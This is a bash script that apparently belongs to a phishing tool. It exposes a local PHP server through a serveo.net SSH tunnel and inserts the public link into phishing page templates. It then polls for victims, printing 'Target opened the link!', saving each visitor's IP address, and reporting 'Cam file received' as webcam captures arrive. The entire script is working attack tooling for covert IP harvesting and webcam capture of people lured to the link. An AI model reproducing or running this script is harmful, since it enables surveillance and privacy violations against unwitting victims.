
rm -rf say.sh
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '')
IFS=$'
'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m
" $ip
cat ip.txt >> saved.ip.txt
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}
checkfound() {
printf "
"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m
"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "
\e[1;92m[\e[0m+\e[1;92m] Target opened the link!
"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "
\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m
"
rm -rf Log.log
fi
sleep 0.5
done 
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index2.html > index.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m
"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R whoami:80:localhost:8080 serveo.net  2> /dev/null > sendlink ' 
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:8080)\e[0m
"
fuser -k 8080/tcp > /dev/null 2>&1
php -S localhost:8080 > /dev/null 2>&1 &
}
start() {
server
payload
checkfound
}
start	

        